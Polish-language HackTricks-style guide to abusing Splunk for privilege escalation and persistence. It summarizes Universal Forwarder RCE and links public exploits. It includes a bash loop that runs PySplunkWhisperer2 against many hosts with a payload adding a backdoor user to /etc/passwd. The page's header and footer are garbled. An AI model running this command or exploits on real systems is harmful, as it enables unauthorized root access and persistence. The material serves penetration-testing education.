# Splunk LPE i Utrzymywanie

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

Jeśli **enumerując** maszynę **wewnętrznie** lub **zewnętrznie** znajdziesz **uruchomiony Splunk** (port 8090), jeśli masz szczęście i znasz jakieś **ważne dane logowania**, możesz **wykorzystać usługę Splunk** do **wykonania powłoki** jako użytkownik uruchamiający Splunk. Jeśli uruchamia go root, możesz podnieść uprawnienia do roota.

Jeśli jesteś **już rootem i usługa Splunk nie nasłuchuje tylko na localhost**, możesz **ukraść** plik **hasła** **z** usługi Splunk i **złamać** hasła, lub **dodać nowe** dane logowania. I utrzymać trwałość na hoście.

Na pierwszym obrazie poniżej możesz zobaczyć, jak wygląda strona internetowa Splunkd.



## Podsumowanie Eksploatacji Agenta Splunk Universal Forwarder

Aby uzyskać więcej szczegółów, sprawdź post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). To tylko podsumowanie:

**Przegląd Eksploatacji:**
Eksploatacja celująca w Agenta Splunk Universal Forwarder (UF) pozwala atakującym z hasłem agenta na wykonywanie dowolnego kodu na systemach uruchamiających agenta, co potencjalnie może zagrozić całej sieci.

**Kluczowe Punkty:**
- Agent UF nie weryfikuje przychodzących połączeń ani autentyczności kodu, co czyni go podatnym na nieautoryzowane wykonanie kodu.
- Powszechne metody pozyskiwania haseł obejmują ich lokalizację w katalogach sieciowych, udostępnionych plikach lub dokumentacji wewnętrznej.
- Udana eksploatacja może prowadzić do dostępu na poziomie SYSTEM lub roota na skompromitowanych hostach, wycieków danych i dalszej infiltracji sieci.

**Wykonanie Eksploatacji:**
1. Atakujący uzyskuje hasło agenta UF.
2. Wykorzystuje API Splunk do wysyłania poleceń lub skryptów do agentów.
3. Możliwe działania obejmują ekstrakcję plików, manipulację kontami użytkowników i kompromitację systemu.

**Wpływ:**
- Pełna kompromitacja sieci z uprawnieniami SYSTEM/root na każdym hoście.
- Potencjalna możliwość wyłączenia logowania w celu uniknięcia wykrycia.
- Instalacja backdoorów lub ransomware.

**Przykładowe Polecenie do Eksploatacji:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Użyteczne publiczne exploity:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Wykorzystywanie zapytań Splunk

**Aby uzyskać więcej szczegółów, sprawdź post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
